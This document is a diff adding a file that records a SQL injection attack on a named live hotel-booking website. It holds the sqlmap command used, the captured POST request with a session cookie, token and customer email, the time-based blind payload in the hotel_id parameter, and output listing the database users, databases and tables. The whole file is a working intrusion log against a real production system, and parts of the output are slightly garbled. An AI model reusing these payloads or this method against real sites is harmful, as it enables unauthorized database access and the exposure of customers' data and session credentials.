@@ -1,0 +1,44 @@
+./sqlmap.py -r ala.txt --random-agent --no-cast level 3 --risk 3 --technique=BUEST --thread=10 --dbs
+
+POST /booking/addcart HTTP/1.1
+Host: www.misteraladin.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: https://www.misteraladin.com/hotel/indonesia/bandung/braga/favehotel-braga?hotel_id=630&checkin=2016-12-15&night=1&checkout=2016-12-16
+Content-Length: 450
+Cookie: language=id; currency=IDR; checkin=2016-12-16; night=1; token=c7d9613284952d8240644c4261c379b3a9362f56; customer_email=xrobot.mr%40gmail.com; PHPSESSID=4p7qoa3s2c3kpebon7covi7f91
+Connection: close
+
+order_type=hotel&checkin=2016-12-15&checkout=2016-12-16&night=1&total_room=1&hotel_id=630&room_id=20161215%7C20161216%7CW%7C325%7C229136%7CDBT.SU%7CBAR-BB%7CBB%7C%7C1~2~0%7C%7CN%407E96919FA6E943AF8FFDB6364B4DC5AF&hotel_code=229136&guests=2&currency=IDR&destination_code=BDO&promo=N&promo_pay_less=&promo_last_minute_offer=&promo_value_added=&promo_early=&source=HB&contract_name=&board_code=BB&room_code=DBT.SU&source_tracking=&room_characteristic=SU
+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: hotel_id (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: order_type=hotel&checkin=2016-12-15&checkout=2016-12-16&night=1&total_room=1&hotel_id=630' AND SLEEP(5) AND 'eQkH'='eQkH&room_id=20161215|20161216|W|325|229136|DBT.SU|BAR-BB|BB||1~2~0||N@7E96919FA6E943AF8FFDB6364B4DC5AF&hotel_code=229136&guests=2&currency=IDR&destination_code=BDO&promo=N&promo_pay_less=&promo_last_minute_offer=&promo_value_added=&promo_early=&source=HB&contract_name=&board_code=BB&room_code=DBT.SU&source_tracking=&room_characteristic=SU
+---
+[13:47:02] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.6.13
+back-end DBMS: MySQL >= 5.0.12
+current user:    'misteraladin@%'
+current database:    'ma_prodq'
+atabase management system users [2]:
+[*] 'replicslave
+[*] 'root'@'localhost'
+
+available databases [1]:
+[*] ma_production
+
+Database: ma_production
+[3 tables]
++-----------------+
+| geo_sea         |
+| roads_endpoints |
+| type            |
++-----------------+
